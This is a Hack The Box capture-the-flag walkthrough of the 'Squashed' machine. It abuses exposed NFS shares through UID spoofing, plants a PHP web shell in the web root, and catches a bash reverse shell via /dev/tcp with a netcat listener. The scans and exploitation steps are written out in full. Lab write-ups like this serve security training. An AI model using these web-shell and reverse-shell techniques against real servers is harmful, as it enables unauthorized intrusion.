# Hack The Box - Squashed Walkthrough

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Squashed]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.11.191    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 02:22 EST
Nmap scan report for 10.10.11.191
Host is up (0.096s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Built Better
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      39145/udp6  mountd
|   100005  1,2,3      49899/tcp6  mountd
|   100005  1,2,3      50775/udp   mountd
|   100005  1,2,3      53351/tcp   mountd
|   100021  1,3,4      36232/udp6  nlockmgr
|   100021  1,3,4      38085/tcp   nlockmgr
|   100021  1,3,4      43059/udp   nlockmgr
|   100021  1,3,4      45429/tcp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=2/19%OT=22%CT=1%CU=39278%PV=Y%DS=2%DC=I%G=Y%TM=63F1CE3
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=Z%TS=A)SEQ(SP=1
OS:04%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O
OS:3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE88%W2=
OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSN
OS:W7%CC=Y%Q=)ECN(R=N)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T2(R=Y%
OS:DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G
OS:)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.64 seconds

```

We get back the following result showing that 5 ports are open:
- Port `22`: running `OpenSSH 8.2p1`.
- Port `80`: running `Apache httpd 2.4.41`.
- Port `111`: running `rpcbind 2-4`.
- Port `2049`: running `nfs_acl 3`.

Before starting enumeration, I ran a more comprehensive nmap scan in the background to make sure that I did not miss anything.

So I ran an Rustscan to covers all ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Squashed]
└─$ rustscan -a 10.10.11.191 --range 1-65535
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.191:111
Open 10.10.11.191:80
Open 10.10.11.191:22
Open 10.10.11.191:2049
Open 10.10.11.191:38085
Open 10.10.11.191:53351
Open 10.10.11.191:55047
Open 10.10.11.191:60033
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 111,80,22,2049,38085,53351,55047,60033 10.10.11.191

Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 02:22 EST
Initiating Ping Scan at 02:22
Scanning 10.10.11.191 [2 ports]
Completed Ping Scan at 02:22, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 02:22
Completed Parallel DNS resolution of 1 host. at 02:22, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 02:22
Scanning 10.10.11.191 [8 ports]
Discovered open port 111/tcp on 10.10.11.191
Discovered open port 22/tcp on 10.10.11.191
Discovered open port 80/tcp on 10.10.11.191
Discovered open port 38085/tcp on 10.10.11.191
Discovered open port 55047/tcp on 10.10.11.191
Discovered open port 53351/tcp on 10.10.11.191
Discovered open port 60033/tcp on 10.10.11.191
Discovered open port 2049/tcp on 10.10.11.191
Completed Connect Scan at 02:22, 0.13s elapsed (8 total ports)
Nmap scan report for 10.10.11.191
Host is up, received syn-ack (0.12s latency).
Scanned at 2023-02-19 02:22:58 EST for 0s

PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
80/tcp    open  http    syn-ack
111/tcp   open  rpcbind syn-ack
2049/tcp  open  nfs     syn-ack
38085/tcp open  unknown syn-ack
53351/tcp open  unknown syn-ack
55047/tcp open  unknown syn-ack
60033/tcp open  unknown syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
```

## Enumeration
Visiting the website on port `80`, I found out that the site is for a site for furniture company

sqs-1

There was nothing interesting on the page, none of the links go anywhere.

The page loads as `/` and as `/index.html`, suggesting this is a static site.

The response headers don't give much either.

```
HTTP/1.1 200 OK
Date: Sun, 19 Feb 2023 07:46:46 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Sun, 19 Feb 2023 07:45:01 GMT
ETag: "7f14-5f508b95c8389-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 32532
Connection: close
Content-Type: text/html
```

It's Apache on ubuntu, but doesn't show much else.

So, I decided to run `gobuster` to brute forces directories.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Squashed]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u 10.10.11.191
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.191
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/02/19 02:55:12 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.11.191/images/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.191/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.191/js/]
```

Nothing Interesting here too.

So, now, I decided to check out the port `2049` which was running NFS service.

`showmount` will list what NFS shares are available:

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Squashed]
└─$ showmount -e 10.10.11.191   
Export list for 10.10.11.191:
/home/ross    *
/var/www/html *
```

It looks like both the ross user’s home directory and the web root.

So, first, I decided to look intot the `/home/ross` share using `mount`.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Squashed]
└─$ sudo mount -t nfs 10.10.11.191:/home/ross /mnt
```

Then, I looked for the `/mnt` folder and listed down all the files.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Squashed]
└─$ find /mnt -ls                 
    30718      4 drwxr-xr-x  14 irc      irc          4096 Feb 19 02:21 /mnt
    39115      4 drwxr-xr-x   2 irc      irc          4096 Oct 21 10:57 /mnt/Music
    39116      4 drwxr-xr-x   2 irc      irc          4096 Oct 21 14:57 /mnt/Pictures
    30203      4 -rw-------   1 irc      irc          2475 Oct 31 10:13 /mnt/.xsession-errors.old
    39023      4 drwx------  11 irc      irc          4096 Oct 21 14:57 /mnt/.cache
find: ‘/mnt/.cache’: Permission denied
    39113      4 drwxr-xr-x   2 irc      irc          4096 Oct 21 14:57 /mnt/Public
    39114      4 drwxr-xr-x   2 irc      irc          4096 Oct 21 14:57 /mnt/Documents
    39343      4 -rw-rw-r--   1 irc      irc          1365 Oct 19 12:57 /mnt/Documents/Passwords.kdbx
    39080      4 drwx------  12 irc      irc          4096 Oct 21 14:57 /mnt/.config
...[snip]...
```

I noteed that the user and group id for everything in this directory is `1001`. It’s not showing a user or group name because on my VM, there is no user with that id.

NFS doesn’t track users/groups across machines. It just knows the `ids`, and uses the local system for that. For example, if I change the `irc` user to userid `1001`, and the irc group to groupid `1001`, then it looks like these files are owned by irc:

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Squashed]
└─$ find /mnt -ls
    30718      4 drwxr-xr-x  14 irc      irc          4096 Feb 19 02:21 /mnt
    39115      4 drwxr-xr-x   2 irc      irc          4096 Oct 21 10:57 /mnt/Music
    39116      4 drwxr-xr-x   2 irc      irc          4096 Oct 21 14:57 /mnt/Pictures
    30203      4 -rw-------   1 irc      irc          2475 Oct 31 10:13 /mnt/.xsession-errors.old
    39023      4 drwx------  11 irc      irc          4096 Oct 21 14:57 /mnt/.cache
find: ‘/mnt/.cache’: Permission denied
    39113      4 drwxr-xr-x   2 irc      irc          4096 Oct 21 14:57 /mnt/Public
    39114      4 drwxr-xr-x   2 irc      irc          4096 Oct 21 14:57 /mnt/Documents
    39343      4 -rw-rw-r--   1 irc      irc          1365 Oct 19 12:57 /mnt/Documents/Passwords.kdbx
    39080      4 drwx------  12 irc      irc          4096 Oct 21 14:57 /mnt/.config
```

So, I decided to create a dummy user.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Squashed]
└─$ sudo useradd fak3r
```

This user is already userid `1001` on my machine, but if it wasn’t, I could change it just like above for `irc`.

I’ll get a shell as `fak3r` and try to write to `ross’ home directory`, but it fails:

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Squashed]
└─$ sudo su fak3r                                 
$ id
uid=1004(fak3r) gid=1004(fak3r) groups=1004(fak3r)
$ bash
fak3r@kali:/home/kali/Desktop/HackTheBox/Linux-Boxes/Squashed$ cd .ssh
bash: cd: .ssh: No such file or directory
fak3r@kali:/home/kali/Desktop/HackTheBox/Linux-Boxes/Squashed$ mkdir .ssh
mkdir: cannot create directory ‘.ssh’: Permission denied
fak3r@kali:/home/kali/Desktop/HackTheBox/Linux-Boxes/Squashed$ xxd .Xauthority
xxd: .Xauthority: No such file or directory
fak3r@kali:/home/kali/Desktop/HackTheBox/Linux-Boxes/Squashed$ ls -la
total 12
drwxr-xr-x  3 darshan kali 4096 Feb 19 02:21 .
drwxr-xr-x 22 darshan kali 4096 Feb 19 02:21 ..
drwxr-xr-x  2 darshan kali 4096 Feb 19 02:21 nmap
fak3r@kali:/home/kali/Desktop/HackTheBox/Linux-Boxes/Squashed$ cd /mnt
fak3r@kali:/mnt$ ls -la
total 104
drwxr-xr-x 14 darshan 1001  4096 Feb 19 02:21 .
drwxr-xr-x 19 root    root 36864 Feb 13 10:38 ..
lrwxrwxrwx  1 root    root     9 Oct 20 09:24 .bash_history -> /dev/null
drwx------ 11 darshan 1001  4096 Oct 21 10:57 .cache
drwx------ 12 darshan 1001  4096 Oct 21 10:57 .config
drwxr-xr-x  2 darshan 1001  4096 Oct 21 10:57 Desktop
drwxr-xr-x  2 darshan 1001  4096 Oct 21 10:57 Documents
drwxr-xr-x  2 darshan 1001  4096 Oct 21 10:57 Downloads
drwx------  3 darshan 1001  4096 Oct 21 10:57 .gnupg
drwx------  3 darshan 1001  4096 Oct 21 10:57 .local
drwxr-xr-x  2 darshan 1001  4096 Oct 21 10:57 Music
drwxr-xr-x  2 darshan 1001  4096 Oct 21 10:57 Pictures
drwxr-xr-x  2 darshan 1001  4096 Oct 21 10:57 Public
drwxr-xr-x  2 darshan 1001  4096 Oct 21 10:57 Templates
drwxr-xr-x  2 darshan 1001  4096 Oct 21 10:57 Videos
lrwxrwxrwx  1 root    root     9 Oct 21 09:07 .viminfo -> /dev/null
-rw-------  1 darshan 1001    57 Feb 19 02:21 .Xauthority
-rw-------  1 darshan 1001  2475 Feb 19 02:21 .xsession-errors
-rw-------  1 darshan 1001  2475 Dec 27 10:33 .xsession-errors.old
fak3r@kali:/mnt$ xxd .Xauthority
xxd: .Xauthority: Permission denied
```

There is a `.Xauthority` file in the home directory. I looked out for it on blog posts of the people who completed this box, and I was surprised that I was not able to read it, while others were able to read it.

So, I decided to leave it alone for a while and move on to mount the `/var/www/html`

I’ll `unmount` the `home` directory and `mount` the `web root`:

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Squashed]
└─$ sudo umount /mnt

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Squashed]
└─$ sudo mount -t nfs 10.10.11.191:/var/www/html /mnt
```

I was unable to access most of the stuff.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Squashed]
└─$ find /mnt -ls
   133456      4 drwxr-xr--   5 2017     www-data     4096 Feb 19 03:55 /mnt
find: ‘/mnt/.htaccess’: Permission denied
find: ‘/mnt/index.html’: Permission denied
find: ‘/mnt/images’: Permission denied
find: ‘/mnt/css’: Permission denied
find: ‘/mnt/js’: Permission denied


┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Squashed]
└─$ ls -l /mnt                    
ls: cannot access '/mnt/index.html': Permission denied
ls: cannot access '/mnt/images': Permission denied
ls: cannot access '/mnt/css': Permission denied
ls: cannot access '/mnt/js': Permission denied
total 0
?????????? ? ? ? ?            ? css
?????????? ? ? ? ?            ? images
?????????? ? ? ? ?            ? index.html
?????????? ? ? ? ?            ? js
                                     
```

Looking at the directory itself, it seems to be owned by userid `2017` and groupid of `www-data` on my system, which is `33`:

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Squashed]
└─$ ls -ld /mnt
drwxr-xr-- 5 2017 www-data 4096 Feb 19 03:55 /mnt
                                                                                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Squashed]
└─$ cat /etc/group | grep www-data
www-data:x:33:
```

## Initial Foothold.

Since the web-root is owned by the userid `2017`, and the groupid `33`, I decided to set my `fak3r` userid to `2017`, and drop into a shell as `fak3r`. 

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Squashed]
└─$ sudo usermod -u 2017 fak3r                       
                                                                                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Squashed]
└─$ sudo su fak3r -c bash     
bash: cannot set terminal process group (5990): Inappropriate ioctl for device
bash: no job control in this shell
```

Now, I was able to read the share.
```
fak3r@kali:/home/kali/Desktop/HackTheBox/Linux-Boxes/Squashed$ ls -l /mnt
total 44
drwxr-xr-x 2 fak3r www-data  4096 Feb 19 04:10 css
drwxr-xr-x 2 fak3r www-data  4096 Feb 19 04:10 images
-rw-r----- 1 fak3r www-data 32532 Feb 19 04:10 index.html
drwxr-xr-x 2 fak3r www-data  4096 Feb 19 04:10 js
```

Now that I was able to access the web-root, I could write files to it too, so I decided to test it out.

```
fak3r@kali:/home/kali/Desktop/HackTheBox/Linux-Boxes/Squashed$ echo "Test?" > /mnt/test.html

```

Loading up `http://squashed.htb/test.html` in the browser, it returned the message

NOTE: I had added the IP and its host in `/etc/hosts` file

sqs-2

So now, I tried to check if the site was able to handle the `PHP` code, cause its worth taking a shot and seeing it whether the webserver will execute PHP or not.

I wrote a small script that echoes back a message.

```
fak3r@kali:/home/kali/Desktop/HackTheBox/Linux-Boxes/Squashed$ echo -e '<?php\n  echo "This is a PHP test script";\n?>'
<?php
  echo "This is a PHP test script";
?>
fak3r@kali:/home/kali/Desktop/HackTheBox/Linux-Boxes/Squashed$ echo -e '<?php\n  echo "This is a PHP test script";\n?>' > /mnt/test.php
```

On visiting the `http://squashed.htb/test/php`, I was able to see the following image which was a clear indication of `php` being executed on the site.

sqs-3

So now, I overwrite the same file with a simple `PHP` web-shell.

```
fak3r@kali:/home/kali/Desktop/HackTheBox/Linux-Boxes/Squashed$ echo -e '<?php\n  system($_REQUEST['cmd']);\n?>'
<?php
  system($_REQUEST[cmd]);
?>
fak3r@kali:/home/kali/Desktop/HackTheBox/Linux-Boxes/Squashed$ echo -e '<?php\n  system($_REQUEST['cmd']);\n?>' > /mnt/test.php
```

Visiting the website, if I just load the page, there’s nothing there. But if I add `?cmd=id` to the end:

sqs-4


TO go from this webshell to a full reverse shell, I'll just pass in a bash reverse shell as `cmd`:

```
bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
```
NOTE: In order for the reverse shell to work, you'll have to URL encode it.

Before that, I turned on my netcat listener on the same port that I passed in through the bash command.

```
nc -lvnp 4444
```

Once I hit send on the website, and checked on my netcat listener, I immediately got back a reverse shell

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.53] from (UNKNOWN) [10.10.11.191] 57842
bash: cannot set terminal process group (1078): Inappropriate ioctl for device
bash: no job control in this shell
alex@squashed:/var/www/html$ whoami
whoami
alex
```

Grabbing the user flag.

```
alex@squashed:/var/www/html$ ls
ls
css
images
index.html
js
alex@squashed:/var/www/html$ cd /home
cd /home
alex@squashed:/home$ ls
ls
alex
ross
alex@squashed:/home$ cd alex
cd alex
alex@squashed:/home/alex$ cat user.txt
cat user.txt
[REDACTED]

```

